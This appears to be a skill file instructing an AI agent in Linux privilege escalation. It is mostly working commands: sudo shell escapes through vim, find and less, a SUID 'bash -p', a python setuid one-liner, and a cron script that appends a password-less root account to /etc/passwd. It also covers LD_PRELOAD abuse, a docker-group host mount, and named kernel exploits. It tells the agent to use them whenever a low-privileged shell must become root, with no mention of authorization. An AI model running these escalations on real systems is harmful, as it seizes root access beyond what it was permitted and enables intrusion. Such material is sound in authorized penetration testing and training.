---
name: privesc-linux
description: "Linux privilege escalation: SUID/SGID, sudo misconfiguration, cron abuse, capabilities, and kernel exploits. Use this skill when a low-privileged shell must become root."
---

# Linux Privesc

## Overview

Enumeration first, exploit second. Most escalations are misconfigurations, not kernel bugs.

## Enumerate

```bash
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
ls -la /etc/ld.so.preload
cat /etc/passwd | grep -v nologin
```

```bash
./linpeas.sh -a
```

## sudo

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim  ->  sudo vim -c ':!/bin/sh'
# (ALL) NOPASSWD: /usr/bin/find  ->  sudo find / -exec /bin/sh \;
# (ALL) NOPASSWD: /usr/bin/less  ->  sudo less /etc/passwd  then  !/bin/sh
```

Reference: GTFOBins for every binary.

## SUID

```bash
# a SUID binary that runs a command
find / -perm -4000 -type f 2>/dev/null | while read b; do echo "== $b"; strings "$b" | grep -E "^-|sh$"; done
# exploit via GTFOBins
```

```bash
# SUID bash
/bin/bash -p
```

## Capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid+ep on python
python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
```

## Cron

```bash
# writable script run by root's cron
ls -la /etc/cron.d/; cat /etc/cron.d/*
# PATH abuse
echo 'echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd' > /tmp/x
```

## LD_PRELOAD / ld.so.preload

```bash
# if sudo -l shows env_keep+=LD_PRELOAD
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so some_binary
```

## Writable service files

```bash
systemctl list-units --type=service
find /etc/systemd -writable 2>/dev/null
```

## Kernel exploits

```bash
uname -r
searchsploit linux kernel 5.4
# DirtyPipe (5.8-5.16), PwnKit, DirtyCOW (2.6-3.19)
```

## Docker group

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Pitfalls

- A kernel exploit can panic the host — check the target's value.
- Automated scripts produce false positives; verify each.
- SELinux/AppArmor limit what root-in-a-container can do.

## Verification

`id` must return `uid=0` after the escalation.
